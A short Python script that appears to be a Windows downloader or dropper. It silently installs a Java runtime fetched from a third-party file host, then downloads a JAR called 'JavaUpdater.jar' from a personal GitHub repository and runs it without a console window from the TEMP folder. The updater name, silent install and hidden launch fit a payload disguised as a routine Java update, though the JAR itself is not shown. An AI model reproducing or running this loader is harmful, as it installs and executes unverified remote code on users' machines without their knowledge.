import os
import subprocess
import requests
from pathlib import Path
import re

def is_java_installed():
    try:
        subprocess.check_output("java -version", stderr=subprocess.STDOUT, shell=True)
        return True
    except subprocess.CalledProcessError:
        return False

def get_java_path():
    java_path = None
    try:
        output = subprocess.check_output("where java", shell=True)
        match = re.search(r'(.*)\\java.exe', output.decode('utf-8'))
        if match:
            java_path = match.group(1)
    except subprocess.CalledProcessError:
        pass
    return java_path

def download(url, local_filename):
    response = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
    return local_filename

def install_java_silently(installer_path):
    subprocess.run(f"{installer_path} /s", shell=True, check=True)

def run_updater(updater_path, java_path):
    subprocess.run(f"{java_path}\\javaw.exe -jar {updater_path}", shell=True, check=True)

def delete(installer_path):
    os.remove(installer_path)

temp_dir = Path(os.getenv("TEMP"))

if not is_java_installed():
    java_url = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe"
    local_filename = temp_dir / "jre-8u371-windows-x64.exe"
    download(java_url, local_filename)
    install_java_silently(local_filename)
    delete(local_filename)
else:
    print("Java is already installed.")

java_path = get_java_path()

if not java_path:
    print("Java path not found.")
else:
    updater_url = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar"
    updater_path = temp_dir / "JavaUpdater.jar"
    download(updater_url, updater_path)
    run_updater(updater_path, java_path)